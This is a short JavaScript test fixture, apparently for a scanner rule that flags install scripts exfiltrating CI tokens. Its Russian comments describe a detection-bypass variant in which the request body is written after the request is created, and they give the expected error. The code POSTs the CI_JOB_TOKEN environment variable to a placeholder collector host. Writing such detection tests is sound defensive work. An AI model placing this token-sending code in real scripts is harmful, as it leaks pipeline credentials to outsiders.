// Обход по форме стока: тело пишется в объект запроса после его создания.
// Ожидается ERROR install-script-ci-token-exfil.
const req = require('https').request('https://collector.example.invalid/c', { method: 'POST' });

req.write(JSON.stringify({ t: process.env.CI_JOB_TOKEN }));
